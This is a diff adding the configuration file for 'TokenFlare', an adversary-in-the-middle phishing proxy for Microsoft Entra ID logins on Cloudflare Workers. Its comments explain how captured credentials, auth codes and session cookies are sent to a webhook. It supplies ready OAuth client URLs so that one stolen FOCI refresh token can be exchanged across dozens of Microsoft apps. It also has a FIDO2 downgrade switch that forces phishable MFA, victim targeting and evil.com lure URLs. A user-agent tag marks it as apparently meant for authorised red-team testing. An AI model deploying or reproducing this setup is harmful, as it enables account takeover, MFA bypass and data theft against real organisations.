@@ -1,0 +1,132 @@
+# ════════════════════════════════════════════════════════════════════
+# TokenFlare — wrangler.toml
+# AiTM Phishing Proxy Configuration
+# ════════════════════════════════════════════════════════════════════
+# All settings can be changed after deployment via:
+#   CF Dashboard > Workers > Settings > Variables
+# ════════════════════════════════════════════════════════════════════
+
+name = "tokenflare"
+main = "src/worker.js"
+compatibility_date = "2025-12-12"
+
+# ── Cloudflare Account ──────────────────────────────────────────────
+account_id = "YOUR_CF_ACCOUNT_ID_HERE"
+workers_dev = true        # Set to false if deploying to a custom domain
+minify = false
+
+# ── Logging ─────────────────────────────────────────────────────────
+[observability.logs]
+enabled = true
+
+# ════════════════════════════════════════════════════════════════════
+# ENVIRONMENT VARIABLES
+# ════════════════════════════════════════════════════════════════════
+[vars]
+
+# ── Phishing Domain ─────────────────────────────────────────────────
+# Set by `init` command. The domain victims will see in their browser.
+LOCAL_PHISHING_DOMAIN = ""
+
+# ── IP Allowlisting ─────────────────────────────────────────────────
+# Empty = all IPs allowed (normal for production phishing)
+# Set to restrict access during testing: "127.0.0.1" or "10.0.0.0/8"
+ALLOWED_IPS = ""
+
+# ── Alerting / Webhook ──────────────────────────────────────────────
+# Where captured credentials, auth codes, and cookies are sent.
+# For local testing with tokenflare-webhook.py, use localhost:9999.
+# For Slack/Discord/Teams, use the respective webhook URL.
+# IMPORTANT: Must end with /webhook for the /exchange endpoint to work.
+WEBHOOK_URL = "http://localhost:9999/webhook"
+
+# ── Debugging ───────────────────────────────────────────────────────
+DEBUGGING = "false"
+
+# ── Client / Tenant Settings ────────────────────────────────────────
+# Set to target tenant domain for branded login page (e.g., "contoso.com")
+# Use "common" for generic Microsoft login
+CLIENT_TENANT = "common"
+
+# Where the victim is sent AFTER auth completes successfully
+FINAL_REDIR = "https://www.office.com"
+
+# Where unauthorized visitors (bad UUID) are redirected
+UNAUTH_REDIR = "https://www.office.com"
+
+# ── Lure Settings ───────────────────────────────────────────────────
+# Lure URL format: https://<phishing-domain><LURE_PATH>?<LURE_PARAM>=<uuid>
+# Example: https://evil.com/verifyme?userid=550e8400-e29b-41d4-a716-446655440000
+LURE_PATH = "/verifyme"
+LURE_PARAM = "userid"
+LURE_UUID = ""
+
+# ── Multiple Client Strategy ────────────────────────────────────────
+# A single phish captures ONE auth code for ONE client. However, if the
+# client is FOCI-capable, the resulting refresh token can be exchanged to
+# ALL 38 FOCI clients server-side via TokenSmith's FOCI Discovery.
+# Strategy: phish with a FOCI client (e.g., Microsoft Office), then use
+# TokenSmith to exchange the refresh token across the entire FOCI family.
+# No need to phish multiple times — one capture covers all FOCI clients.
+
+# ── OAuth Client Configuration ──────────────────────────────────────
+# Choose ONE client for the phishing flow. FOCI clients allow refresh token
+# exchange across 38+ Microsoft apps after capture.
+#
+# RECOMMENDED: Microsoft Office (FOCI) — broadest default consent, best for
+# FOCI discovery. Gets Graph + Exchange + SharePoint via token exchange.
+# Uses urn:oob redirect which is widely accepted by first-party apps.
+UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+#
+# Microsoft Office (FOCI) — nativeclient redirect (try if urn:oob doesn't work)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+#
+# Azure PowerShell (FOCI) — Graph access, common for admin scenarios
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+#
+# Microsoft Teams (FOCI) — broad consent, good alternative to Office
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+#
+# Microsoft Intune (FOCI) — use for Intune CA bypass testing
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+#
+# Office Home (NOT FOCI) — gets rich session cookies but no FOCI exchange
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=28145'
+
+# ── Custom User Agent ───────────────────────────────────────────────
+# Falls back to proxying the victim's UA if commented out
+CUSTOM_USER_AGENT = 'TokenFlare/1.0 For_Authorised_Testing_Only'
+
+# ── FIDO2 Downgrade ─────────────────────────────────────────────────
+# When enabled, spoofs User-Agent to force Entra ID to disable passkey
+# prompt and fall back to phishable MFA methods (push, TOTP, SMS)
+FIDO2_DOWNGRADE = "false"
+
+# ── HTML Injection ──────────────────────────────────────────────────
+# When enabled, injects a telemetry script into login page responses.
+# Captures: browser capabilities, WebAuthn support, field timing,
+# page visibility changes. Does NOT capture credentials (proxy does that).
+HTML_INJECTION = "false"
+
+# ── Victim Targeting ────────────────────────────────────────────────
+# When enabled, only proxies auth flows for emails stored in KV.
+# Add targets: curl -X POST https://<worker>/api/targets -d '{"emails":["user@company.com"]}'
+# When disabled (default), all visitors are proxied.
+TARGETING_ENABLED = "false"
+
+# ── Edge Token Exchange ─────────────────────────────────────────────
+# When enabled, exchanges auth codes directly at the Cloudflare edge
+# (lower latency than webhook). Tokens sent as 'edge_exchange' event.
+# Note: may cause duplicate exchange attempts with webhook listener.
+EDGE_EXCHANGE = "false"
+
+# ════════════════════════════════════════════════════════════════════
+# WORKERS KV — Session Correlation
+# ════════════════════════════════════════════════════════════════════
+# Stores per-victim session timelines correlating all auth flow captures.
+# For production: wrangler kv:namespace create "SESSIONS" and update the ID.
+# For local dev: wrangler automatically creates a local KV store.
+[[kv_namespaces]]
+binding = "SESSIONS"
+id = "tokenflare_sessions"
+preview_id = "tokenflare_sessions_preview"
